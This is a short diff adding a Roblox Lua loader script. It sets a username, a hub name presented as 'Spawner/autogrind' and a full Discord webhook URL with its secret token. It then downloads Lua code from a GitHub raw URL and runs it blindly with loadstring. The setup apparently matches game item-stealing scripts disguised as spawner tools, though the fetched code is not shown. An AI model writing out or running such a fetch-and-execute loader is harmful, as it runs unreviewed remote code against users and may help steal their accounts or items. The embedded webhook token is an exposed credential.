@@ -1,0 +1,5 @@
+_G.UserName = "xxc_ke"
+_G.HubName = "Spawner/autogrind"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1131528360472875029/81zaFFTrK3yn9ENiAN3aHGGvSJlwLSQB-Ky9Y43f1RuS0-1I9Pko9Hod050NMlG0ccEy"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
